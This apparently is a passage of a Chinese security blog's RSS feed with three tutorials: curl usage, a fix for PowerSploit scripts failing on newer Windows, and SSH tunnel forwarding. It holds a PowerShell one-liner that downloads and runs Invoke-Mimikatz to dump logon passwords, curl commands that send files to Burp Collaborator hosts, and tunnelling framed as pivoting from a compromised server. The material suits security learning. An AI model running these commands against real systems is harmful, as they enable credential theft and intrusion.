&lt;h2 id="0x01-linux中的curl">0x01 Linux中的curl&lt;/h2>
&lt;h3 id="1http请求">1.http请求&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>get&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>curl 命令后面直接跟url；使用-H指定请求头，每个-H指定一条header；使用 -o 指定输出到具体文件而不是标准输出。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl &lt;span style="color:#e6db74">&amp;#39;https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&amp;amp;sign=5fd0f26e3346e8171e8656caaa42b0fc&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">&amp;#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">&amp;#39;Referer: https://admin.college.360.cn/user/student/course/1032&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;strong>post&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>普通表单post，使用-d指定请求体内容。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl -d &lt;span style="color:#e6db74">&amp;#34;user=admin&amp;amp;passwd=12345678&amp;#34;&lt;/span> http://127.0.0.1:8080/login
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>文件表单post，使用-F指定需要上传的文件。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://oumchi.burpcollaborator.net -F &lt;span style="color:#e6db74">&amp;#34;6379.txt=@6379.txt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 发送出的请求如下：&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># POST / HTTP/1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Host: oumchi.burpcollaborator.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># User-Agent: curl/7.58.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Accept: */*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Content-Length: 1978&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Content-Type: multipart/form-data; boundary=------------------------c9011604f054ee36&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Expect: 100-continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --------------------------c9011604f054ee36&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Content-Disposition: form-data; name=&amp;#34;6379.txt&amp;#34;; filename=&amp;#34;6379.txt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Content-Type: text/plain&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Starting Nmap 7.60 ( https://nmap.org ) at 2018-09-01 08:25 UTC&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># SYN Stealth Scan Timing: About 3.82% done; ETC: 09:00 (0:34:01 remaining)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># SYN Stealth Scan Timing: About 3.82% done; ETC: 09:00 (0:33:59 remaining)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># SYN Stealth Scan Timing: About 3.83% done; ETC: 09:00 (0:33:55 remaining)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --------------------------c9011604f054ee36--&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>put&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://6biy7e.burpcollaborator.net/ -T ca_setup.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>其它方法测试&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://www.example.com -X OPTIONS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl http://www.example.com -X TRACE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="2ftp请求">2.ftp请求&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>get&lt;/strong>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl ftp://user:passwd@ftpserver.com:port/path/filename -o filepath
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;strong>put&lt;/strong>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl –u name:passwd -T size.mp3 ftp://www.xxx.com/mp3/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;strong>ls(dir)&lt;/strong>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl ftp://user:passwd@ftpserver.com:port/path/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;strong>delete&lt;/strong>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl –u name:passwd ftp://www.xxx.com/ -X &lt;span style="color:#e6db74">&amp;#39;DELE mp3/size.mp3&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="3其他">3.其他&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-ba&amp;#39;sh" data-lang="ba&amp;#39;sh">-u, --user &amp;lt;user:password&amp;gt; 需要口令验证的http或ftp
--ntlm 使用htlm认证
-A, --user-agent &amp;lt;name&amp;gt; 指定请求头中的user-agent字段
--socks5 &amp;lt;host[:port]&amp;gt; 使用sockes5代理
-x, --proxy [protocol://]host[:port] 使用http/https代理
 
--post301 Do not switch to GET after following a 301 不跳转301
--post302 Do not switch to GET after following a 302 不跳转302
--post303 Do not switch to GET after following a 303 不跳转303
&lt;/code>&lt;/pre>&lt;h2 id="0x02-windows中的curl">0x02 Windows中的curl&lt;/h2>
&lt;p>powershell 中的curl是&lt;code>Invoke-WebRequest&lt;/code>，它的另一个别名是wget。它是使用&lt;code>-Headers &amp;lt;IDictionary&amp;gt;&lt;/code>来指定请求头，powershell5.x即以前版本可以指定所有请求头，之后的版本UserAgent只能通过&lt;code>-UserAgent &amp;lt;String&amp;gt;&lt;/code>指定。&lt;/p></description></item><item><title>powersploit中多个脚本在windows10和server2016上报错</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/</guid><description>&lt;p>报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。&lt;/p>
&lt;ul>
&lt;li>错误信息如下:&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>PS C:\WINDOWS\system32&amp;gt; iex (New-Object System.Net.WebClient).DownloadString(&lt;span style="color:#e6db74">&amp;#39;https://raw.githubusercontent.com/PowerShe
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">llMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;#39;&lt;/span>);Invoke-Mimikatz -Command &lt;span style="color:#e6db74">&amp;#39;&amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::lo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">gonPasswords full&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>使用&lt;span style="color:#960050;background-color:#1e0010">“&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">”&lt;/span>个参数调用&lt;span style="color:#960050;background-color:#1e0010">“&lt;/span>GetMethod&lt;span style="color:#960050;background-color:#1e0010">”&lt;/span>时发生异常&lt;span style="color:#960050;background-color:#1e0010">:“&lt;/span>发现不明确的匹配&lt;span style="color:#960050;background-color:#1e0010">。”&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>所在位置 行&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>&lt;span style="color:#ae81ff">886&lt;/span> 字符&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ $GetProcAddress = $UnsafeNativeMethods.GetMethod(&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>GetProcAddr ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + CategoryInfo &lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> NotSpecified&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> (&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>) [], MethodInvocationException
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + FullyQualifiedErrorId &lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> AmbiguousMatchException
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>不能对 Null 值表达式调用方法&lt;span style="color:#960050;background-color:#1e0010">。&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>所在位置 行&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>&lt;span style="color:#ae81ff">893&lt;/span> 字符&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + CategoryInfo &lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> InvalidOperation&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> (&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>) []&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>RuntimeException
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + FullyQualifiedErrorId &lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> InvokeMethodOnNull
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>找不到&lt;span style="color:#960050;background-color:#1e0010">“&lt;/span>GetDelegateForFunctionPointer&lt;span style="color:#960050;background-color:#1e0010">”&lt;/span>的重载&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>参数计数为&lt;span style="color:#960050;background-color:#1e0010">:“&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">”。&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>所在位置 行&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>&lt;span style="color:#ae81ff">489&lt;/span> 字符&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ $VirtualAlloc = [&lt;span style="color:#66d9ef">System.Runtime.InteropServices.Marshal&lt;/span>]::Get ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + CategoryInfo &lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> NotSpecified&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> (&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>) [], MethodException
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + FullyQualifiedErrorId &lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> MethodCountCouldNotFindBest
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.............
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...省略n行...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.............
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;a href="https://github.com/PowerShellMafia/PowerSploit/issues/293">解决方法&lt;/a>：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>请尝试更改该行：
$GetProcAddress = $UnsafeNativeMethods.GetMethod(&amp;#39;GetProcAddress&amp;#39;)
至
$GetProcAddress = $UnsafeNativeMethods.GetMethod(&amp;#39;GetProcAddress&amp;#39;, [reflection.bindingflags] &amp;#34;Public,Static&amp;#34;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>报错分析：&lt;/li>
&lt;/ul>
&lt;p>报错的第886行代码为&lt;code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')&lt;/code>,它存在如下函数中：&lt;/p></description></item><item><title>SSH隧道转发</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/</guid><description>&lt;h2 id="0x00-ssh常用参数说明">0x00 ssh常用参数说明&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>-C 压缩传输数据,加快传输速度
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-f 后台对用户名密码进行认证
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-N 仅仅只用来转发,不用再弹回一个新的shell
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-n 后台运行
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-q 安静模式,不要显示警告等信息
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-l 指定ssh登录名
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-g 允许远程主机连接到本地转发的端口（本机监听地址设为0.0.0.0，不选则为127.0.0.1） 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-L 进行本地端口转发
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-R 进行远程端口转发
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-D 动态转发,即socks代理
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-T 禁止分配伪终端
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-p 指定远程ssh服务端口
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x01-本地转发">0x01 本地转发&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh &lt;span style="color:#f92672">[&lt;/span>-C&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>-f&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>-N&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>-g&lt;span style="color:#f92672">]&lt;/span> -L &lt;span style="color:#f92672">[&lt;/span>本机ip&lt;span style="color:#f92672">]&lt;/span>:本机端口:vps能访问的主机ip:端口 &amp;lt;user@vps&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将本地的一个端口映射到vps能到达的主机的一个端口。如果vps是边界设备，拥有多网卡，那么就可以用该方法访问内网主机的服务。&lt;/p>
&lt;blockquote>
&lt;p>例：假如你拥有一台web服务器的控制权，但是数据库服务器没有公网IP，你想直接访问数据库的服务，这时就可以使用本地转发，在本地（local）执行如下命令：&lt;/p>&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh -Nnf -L 6666:10.10.10.12:3306 root@188.224.123.45
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#访问本地的6666端口就可以被映射到数据库10.10.10.12的3306端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mysql -u root -ppassword -P &lt;span style="color:#ae81ff">6666&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>序列图如下：&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/1536460373438.png" alt="1536460373438">&lt;/p>
&lt;h2 id="0x02-远程转发">0x02 远程转发&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh -C -f -N -R 0.0.0.0:vps_port:本机能访问的IP:端口 root@vps
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将vps上的一个端口映射到本机能到达的主机的一个端口。以至于可以通过vps访问内网的计算机上面的服务。遗憾的是，即使你指定了监听地址为0.0.0.0，它也仅能监听127.0.0.1，不能实现内网穿透。&lt;/p>
&lt;p>然后经过一番折腾，得出答案，需要修改sshd的配置文件&lt;code>/etc/ssh/sshd_config&lt;/code>,将配置做如下修改：&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-config" data-lang="config">GatewayPorts yes
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#重启sshd服务&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>service sshd restart &lt;span style="color:#f92672">||&lt;/span> systemctl restart sshd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x03-动态转发">0x03 动态转发&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh -qTfnN -D 0.0.0.0:1080 root@vps -p &lt;span style="color:#ae81ff">22&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>本机将本地1080端口的所有流量发给vps，vps转发收到的流量。这就是赤裸裸的socks代理啊。&lt;/p></description></item></channel></rss>